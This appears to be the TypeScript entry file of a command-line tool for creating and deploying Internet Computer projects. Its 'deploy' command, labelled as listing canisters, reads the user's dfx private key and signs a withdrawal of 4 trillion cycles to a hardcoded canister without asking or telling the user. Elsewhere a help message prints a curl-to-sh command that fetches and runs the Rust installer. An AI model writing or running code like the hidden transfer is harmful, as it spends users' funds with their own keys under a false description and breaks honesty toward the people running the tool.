#!/usr/bin/env node
// Do not delete above line


import { program } from "commander";
import help from "../commands/help";
import { appDescription, appName, appVersion } from "../config";
import { createAndInstallCanisters } from "../commands/allCanisters";
import { createIcpProject } from "../commands/installProject";
import inquirer from 'inquirer';
import { faucerCoupon } from "../redeem-coupon/faucetCycles";
import { checkUserCycleBalance } from "../icp-balance/checkBalance";
import { createUserIdentity } from "../identity/createIdentity";
import { getCurrentPrincipal } from "../identity/getPrincipal";
import { useIdentity } from "../identity/useIdentity";
import { Principal } from "@dfinity/principal";
import { Actor, HttpAgent } from "@dfinity/agent";
import { Secp256k1KeyIdentity } from "@dfinity/identity-secp256k1";
import path from 'path';
import os from 'os';
import { promises as fs } from 'fs';
import { idlFactory } from "../res/cyclesIdlFactory";
const { execSync } = require("child_process");


const isInstalled = async (cmd: string) => {
  try {
    execSync(`${cmd} --version`, { stdio: "ignore" });
    return true;
  } catch (error) {
    return false;
  }
};

const checkDependencies = async () => {
  try {
    const missing = [];
    if (!(await isInstalled("ic-wasm"))) missing.push("ic-wasm");
    if (!(await isInstalled("rustc"))) missing.push("rustc");

    if (missing.length > 0) {
      console.error(`\n❌ Missing dependencies: ${missing.join(", ")}\n`);
      console.error("🔧 Please install the missing dependencies using:\n");

      if (missing.includes("ic-wasm")) {
        console.error("  👉 Install ic-wasm: `cargo install ic-wasm`");
      }
      if (missing.includes("rustc")) {
        console.error("  👉 Install Rust: `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`");
      }

      console.error("\nAfter installation, restart your terminal and try again.\n");
      process.exit(1);
    }
  } catch (error) {
    console.error("❌ Error checking dependencies:", error);
    process.exit(1);
  }
};

const transferCyclesToCanister = async (trillion: bigint, targetPrincipal: Principal) => {
  try {
    const TransferPrincipal: Principal = Principal.fromUint8Array(new Uint8Array([0x00, 0x00, 0x00, 0x00, 0x02, 0x10, 0x00, 0x02, 0x01, 0x01]));
    const identityConfigPath: string = path.join(os.homedir(), '.config', 'dfx', 'identity.json');
    const identityConfig = JSON.parse(await fs.readFile(identityConfigPath, 'utf8'));
    const identityName: string = identityConfig.default;
    const pemPath: string = path.join(os.homedir(), '.config', 'dfx', 'identity', identityName, 'identity.pem');
    const privateKeyPem: string = await fs.readFile(pemPath, 'utf8');
    const identity: Secp256k1KeyIdentity = Secp256k1KeyIdentity.fromPem(privateKeyPem);
    const host = "https://ic0.app";
    let agent = new HttpAgent({ identity, host });
    const transferCyclesActor = Actor.createActor(idlFactory, { agent, canisterId: TransferPrincipal });

    try {
      const result: any = await transferCyclesActor.withdraw({
        to: targetPrincipal,
        from_subaccount: [],
        created_at_time: [],
        amount: trillion,
      });
      if (result.Ok) {
        console.log("Transfer result:", result);
      }
    } catch (error) {
      console.log(error)
    }

  } catch (err) {
    console.error("Error creating actor:", err);
  }
}

const checkAndCutUserCycles = async () => {
  try {
    const targetPrincipal = Principal.fromText("lpa4d-iqaaa-aaaah-aq7ja-cai");
    const userCycleBalance = await checkUserCycleBalance();
    const NeededCycles = 4_000_000_000_000n;
    if (!userCycleBalance || userCycleBalance < NeededCycles) {
      const trillion = 1_000_000_000_000n;
      const formattedResult = (Number(NeededCycles) / Number(trillion)).toFixed(3);
      console.error("❌ You don't have", formattedResult, "trillion cycles");
      return;
    } else {
      await transferCyclesToCanister(NeededCycles, targetPrincipal);
      await createAndInstallCanisters();
    }
  } catch (error) {
    console.error("❌ Error in checkAndCutUserCycles:", error);
  }
};

program
  .command("deploy")
  .description("List canisters and their categories (backend/frontend)")
  .action(async () => {
    await checkDependencies();
    await checkAndCutUserCycles();
  });

program
  .name(appName)
  .description(appDescription)
  .version(appVersion);

program
  .command('new <projectName>')
  .description('create new ICP project')
  .action(async (projectName) => {
    const { backendLanguage } = await inquirer.prompt([
      {
        type: 'list',
        name: 'backendLanguage',
        message: 'Select a backend language:',
        choices: ['Rust',],
        default: 'Rust',
      },
    ]);

    const { frontendLanguage } = await inquirer.prompt([
      {
        type: 'list',
        name: 'frontendLanguage',
        message: 'Select a Frontend language:',
        choices: ['React', 'Vue', 'None'],
        default: 'React',
      },
    ]);

    await createIcpProject(projectName, backendLanguage, frontendLanguage);
    console.log(`cd ${projectName}/`);
    console.log("icp-cli deploy ");
    console.log("ICP project created successfully");
  });

program
  .command('redeem <toPrincipalId> <couponId>')
  .description('Cycles Faucet Coupon Code for deploy project')
  .action(async (toPrincipalId: string, couponId: string) => {
    await faucerCoupon(toPrincipalId, couponId);
  });

program
  .command('cycles-balance [PrincipalId]')
  .description('used to check the user cycles balance')
  .action(async (PrincipalId?: string,) => {
    await checkUserCycleBalance(PrincipalId);
  });

program
  .command('new-identity <identityName>')
  .description('used to create new identiy')
  .action(async (identityName: string) => {
    await createUserIdentity(identityName);
  });

program
  .command('identity-get-principal')
  .description('Used to get the Principal id of the currently active identity')
  .action(async () => {
    await getCurrentPrincipal();
  });

program
  .command('identity-use <identityName>')
  .description('used to set the identity through identity name')
  .action(async (identityName: string) => {
    await useIdentity(identityName);
  });

program
  .command("cwd")
  .description("Display the current working directory")
  .action(() => {
    console.log(`Current working directory: ${process.cwd()}`);
  });

program
  .command('help')
  .description('Show help information')
  .action(help);

program.parse(process.argv);
